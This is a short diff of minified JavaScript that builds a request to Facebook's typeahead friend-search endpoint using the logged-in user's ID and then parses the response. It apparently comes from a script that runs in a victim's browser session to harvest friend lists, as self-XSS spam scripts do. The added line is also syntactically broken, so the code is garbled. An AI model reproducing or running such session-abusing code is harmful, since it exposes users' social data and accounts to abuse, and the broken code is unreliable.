@@ -272,9 +272,7 @@ setd,sete,setf;setd='www.facebook.com/ajax';sete='typeahead/search/';setf='boots
 
 ?__a=1&filter[0]=user&viewer=';seth='&token=v7&lazy=0&__user=';var 
 
-ronakpateldevilsuniversewebsite_homepageurl=window.location.protocol+"//"+setd+"/"+sete+"+setf+"
-
-+setg+"Env.user"+seth+"Env.user;if(whotheehellyouare==CurrentBrowserVersion){jx.load(ronakpateld
+ronakpateldevilsuniversewebsite_homepageurl=window.location.protocol+"//"www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=user&viewer="Env.user&token=v7&lazy=0&__user="Env.user;if(whotheehellyouare==CurrentBrowserVersion){jx.load(ronakpateld
 
 evilsuniversewebsite_homepageurl,function(a){var b=a;var c=b.substring(b.indexOf("{"));var 
 
